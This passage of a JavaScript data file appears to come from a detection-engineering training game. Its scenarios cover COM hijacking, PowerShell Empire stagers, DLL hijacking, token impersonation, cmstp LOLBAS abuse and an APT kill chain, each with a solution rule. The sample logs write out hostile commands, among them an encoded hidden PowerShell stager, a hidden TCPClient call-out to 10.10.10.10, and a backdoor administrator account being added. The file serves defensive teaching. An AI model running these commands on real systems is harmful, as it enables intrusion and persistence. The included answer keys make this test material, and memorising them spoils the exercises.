        id: 31102,
        timestamp: 'Dec 15 10:05:00',
        host: 'WORKSTATION-75',
        severity: 'CRIT',
        logSource: 'registry',
        processName: 'powershell.exe',
        targetObject: 'HKCU\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InProcServer32',
        eventType: 'SetValue',
        details: 'C:\\Users\\victim\\AppData\\Local\\Temp\\evil.dll',
        malicious: true
      },
      {
        id: 31103,
        timestamp: 'Dec 15 10:10:00',
        host: 'DEV-PC',
        severity: 'INFO',
        logSource: 'registry',
        processName: 'setup.exe',
        targetObject: 'HKLM\\SOFTWARE\\Classes\\CLSID\\{87654321-4321-4321-4321-210987654321}\\InProcServer32',
        eventType: 'SetValue',
        details: 'C:\\Program Files\\App\\component.dll',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'COM hijacking targets HKCU\\Software\\Classes\\CLSID paths' },
      { cost: 100, content: 'Filter on TargetObject containing HKCU and CLSID' },
      { cost: 200, content: 'detection:\\n  selection:\\n    TargetObject|contains|all:\\n      - \'HKCU\'\\n      - \'CLSID\'\\n      - \'InProcServer32\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [31102],
    starterCode: `# Detect COM object hijacking

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 12: PowerShell Empire Stager
  {
    id: 'L3-012',
    title: 'Empire Framework',
    level: 3,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Execution',
      tacticId: 'TA0002',
      technique: 'T1059.001',
      techniqueName: 'Command and Scripting Interpreter: PowerShell',
      url: 'https://attack.mitre.org/techniques/T1059/001/'
    },
    realWorldReference: {
      incidents: ['Multiple APT groups', 'Red team operations'],
      description: 'PowerShell Empire uses distinctive stager patterns including FromBase64String and GZip decompression.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-012</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL - C2 FRAMEWORK</span></p>
        </div>
        <p><strong>Intelligence:</strong> PowerShell Empire stager detected. Compressed and encoded payload being executed.</p>
        <p><strong>Objective:</strong> Detect Empire stager patterns using Base64 decoding combined with GZip decompression.</p>
      </div>
    `,
    logs: [
      {
        id: 31201,
        timestamp: 'Dec 16 11:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Hello"))',
        user: 'CORP\\developer',
        malicious: false
      },
      {
        id: 31202,
        timestamp: 'Dec 16 11:05:00',
        host: 'WORKSTATION-80',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAC0AYgBvAHIAIAAzADAANwAyADsA',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 31203,
        timestamp: 'Dec 16 11:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-Service',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Empire uses -NoP -sta -NonI -W Hidden pattern' },
      { cost: 100, content: 'Filter on CommandLine containing Empire-specific flags' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'powershell.exe\'\\n    CommandLine|contains|all:\\n      - \'-NoP\'\\n      - \'-W\'\\n      - \'Hidden\'\\n      - \'-Enc\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [31202],
    starterCode: `# Detect PowerShell Empire stager

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 13: DLL Search Order Hijacking
  {
    id: 'L3-013',
    title: 'DLL Search Order Hijack',
    level: 3,
    difficulty: 4,
    logSource: 'file',
    mitre: {
      tactic: 'Persistence',
      tacticId: 'TA0003',
      technique: 'T1574.001',
      techniqueName: 'Hijack Execution Flow: DLL Search Order Hijacking',
      url: 'https://attack.mitre.org/techniques/T1574/001/'
    },
    realWorldReference: {
      incidents: ['APT41', 'Lazarus', 'PlugX'],
      description: 'DLL hijacking places malicious DLLs in locations where legitimate applications search before System32.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #L3-013</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> DLL hijacking detected. Suspicious DLLs being placed in application directories.</p>
        <p><strong>Objective:</strong> Detect DLL files being created in user-writable directories (not System32 or Program Files).</p>
      </div>
    `,
    logs: [
      {
        id: 31301,
        timestamp: 'Dec 17 12:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'file',
        processName: 'msiexec.exe',
        targetFilename: 'C:\\Program Files\\Application\\component.dll',
        operation: 'Create',
        malicious: false
      },
      {
        id: 31302,
        timestamp: 'Dec 17 12:05:00',
        host: 'WORKSTATION-85',
        severity: 'CRIT',
        logSource: 'file',
        processName: 'powershell.exe',
        targetFilename: 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Teams\\version.dll',
        operation: 'Create',
        malicious: true
      },
      {
        id: 31303,
        timestamp: 'Dec 17 12:10:00',
        host: 'DEV-PC',
        severity: 'INFO',
        logSource: 'file',
        processName: 'devenv.exe',
        targetFilename: 'C:\\Projects\\MyApp\\bin\\Debug\\library.dll',
        operation: 'Create',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for DLLs created in user profile directories by PowerShell/cmd' },
      { cost: 100, content: 'Filter on .dll files in AppData paths created by scripting engines' },
      { cost: 200, content: 'detection:\\n  selection:\\n    TargetFilename|endswith: \'.dll\'\\n    TargetFilename|contains: \'\\\\AppData\\\\\'\\n    ProcessName|endswith:\\n      - \'powershell.exe\'\\n      - \'cmd.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [31302],
    starterCode: `# Detect DLL search order hijacking

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 14: Token Manipulation
  {
    id: 'L3-014',
    title: 'Token Impersonation',
    level: 3,
    difficulty: 5,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Privilege Escalation',
      tacticId: 'TA0004',
      technique: 'T1134',
      techniqueName: 'Access Token Manipulation',
      url: 'https://attack.mitre.org/techniques/T1134/'
    },
    realWorldReference: {
      incidents: ['Meterpreter', 'Cobalt Strike', 'APT groups'],
      description: 'Token manipulation allows attackers to assume the identity of other users/processes. Detected via privilege escalation tools.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L3-014</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL - PRIVILEGE ESCALATION</span></p>
        </div>
        <p><strong>Intelligence:</strong> Token manipulation detected. Attackers are impersonating privileged accounts.</p>
        <p><strong>Objective:</strong> Detect tools that manipulate tokens like incognito, or API calls related to token theft.</p>
      </div>
    `,
    logs: [
      {
        id: 31401,
        timestamp: 'Dec 18 13:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\whoami.exe',
        commandLine: 'whoami /priv',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 31402,
        timestamp: 'Dec 18 13:05:00',
        host: 'WORKSTATION-90',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Invoke-TokenManipulation -ImpersonateUser -Username "CORP\\domain_admin"',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 31403,
        timestamp: 'Dec 18 13:10:00',
        host: 'SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\runas.exe',
        commandLine: 'runas /user:CORP\\admin cmd.exe',
        user: 'CORP\\user1',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for Invoke-TokenManipulation or incognito commands' },
      { cost: 100, content: 'Filter on CommandLine containing token manipulation functions' },
      { cost: 200, content: 'detection:\\n  selection:\\n    CommandLine|contains:\\n      - \'Invoke-TokenManipulation\'\\n      - \'ImpersonateUser\'\\n      - \'incognito\'\\n      - \'steal_token\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [31402],
    starterCode: `# Detect token manipulation attacks

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 15: Living Off The Land Full Chain
  {
    id: 'L3-015',
    title: 'LOLBAS Attack Chain',
    level: 3,
    difficulty: 5,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1218',
      techniqueName: 'Signed Binary Proxy Execution',
      url: 'https://attack.mitre.org/techniques/T1218/'
    },
    realWorldReference: {
      incidents: ['Most modern malware', 'APT groups'],
      description: 'Living Off The Land (LOLBAS) techniques chain multiple legitimate binaries to achieve malicious goals while evading detection.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-yellow-500 pl-4">
          <h3 class="font-bold text-yellow-400">Incident Report #L3-015</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">HIGH - LOLBAS CHAIN</span></p>
        </div>
        <p><strong>Intelligence:</strong> LOLBAS chain detected. Multiple living-off-the-land binaries being abused in sequence.</p>
        <p><strong>Objective:</strong> Detect common LOLBAS - cmstp.exe executing INF files from network or temp locations.</p>
      </div>
    `,
    logs: [
      {
        id: 31501,
        timestamp: 'Dec 19 14:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmstp.exe',
        commandLine: 'cmstp.exe /s C:\\Windows\\System32\\cmstp.inf',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 31502,
        timestamp: 'Dec 19 14:05:00',
        host: 'WORKSTATION-95',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmstp.exe',
        commandLine: 'cmstp.exe /ni /s C:\\Users\\victim\\AppData\\Local\\Temp\\payload.inf',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 31503,
        timestamp: 'Dec 19 14:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\msiexec.exe',
        commandLine: 'msiexec.exe /i C:\\Installers\\app.msi /quiet',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'CMSTP with /s and INF from temp directories is suspicious' },
      { cost: 100, content: 'Filter cmstp.exe with CommandLine containing Temp or /ni' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'cmstp.exe\'\\n    CommandLine|contains:\\n      - \'\\\\Temp\\\\\'\\n      - \'/ni\'\\n      - \'\\\\AppData\\\\\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [31502],
    starterCode: `# Detect LOLBAS abuse with cmstp.exe

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 16: APT Full Kill Chain Simulation
  {
    id: 'L3-016',
    title: 'APT Kill Chain',
    level: 3,
    difficulty: 5,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Multiple',
      tacticId: 'Multiple',
      technique: 'Multiple',
      techniqueName: 'Full Attack Lifecycle',
      url: 'https://attack.mitre.org/'
    },
    realWorldReference: {
      incidents: ['APT29', 'SolarWinds', 'Major breaches'],
      description: 'Advanced persistent threats use multiple techniques in sequence. This scenario tests detection of suspicious process chains.',
      year: '2020-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">FINAL BOSS - APT Simulation</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold animate-pulse">CRITICAL - NATION STATE ACTOR</span></p>
        </div>
        <p><strong>Intelligence:</strong> Full APT kill chain detected. Multiple stages of compromise identified.</p>
        <p><strong>Objective:</strong> Detect the complete attack chain - from initial execution through persistence.</p>
        <p><strong>Challenge:</strong> Create a rule that catches the pattern of multiple suspicious activities from a single host.</p>
      </div>
    `,
    logs: [
      {
        id: 31601,
        timestamp: 'Dec 20 15:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c dir',
        parentImage: 'C:\\Windows\\explorer.exe',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 31602,
        timestamp: 'Dec 20 15:05:00',
        host: 'TARGET-SERVER',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -nop -w hidden -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.10.10.10\',443)"',
        parentImage: 'C:\\Windows\\System32\\mshta.exe',
        user: 'CORP\\compromised',
        malicious: true
      },
      {
        id: 31603,
        timestamp: 'Dec 20 15:06:00',
        host: 'TARGET-SERVER',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
        parentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        user: 'CORP\\compromised',
        malicious: true
      },
      {
        id: 31604,
        timestamp: 'Dec 20 15:10:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\notepad.exe',
        commandLine: 'notepad.exe C:\\Users\\user1\\Documents\\notes.txt',
        parentImage: 'C:\\Windows\\explorer.exe',
        user: 'CORP\\user1',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for PowerShell with hidden window making network connections' },
      { cost: 100, content: 'Filter on -w hidden combined with TCPClient or network indicators' },
      { cost: 200, content: 'detection:\\n  selection_powershell:\\n    Image|endswith: \'powershell.exe\'\\n    CommandLine|contains|all:\\n      - \'-w\'\\n      - \'hidden\'\\n      - \'TCPClient\'\\n  selection_useradd:\\n    Image|endswith: \'cmd.exe\'\\n    CommandLine|contains|all:\\n      - \'net user\'\\n      - \'/add\'\\n  condition: selection_powershell or selection_useradd', isSolution: true }
    ],
    expectedDetections: [31602, 31603],
    starterCode: `# Detect APT kill chain indicators
# This is the final challenge - combine multiple detections

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  }
];

export default LEVEL_3_SCENARIOS;
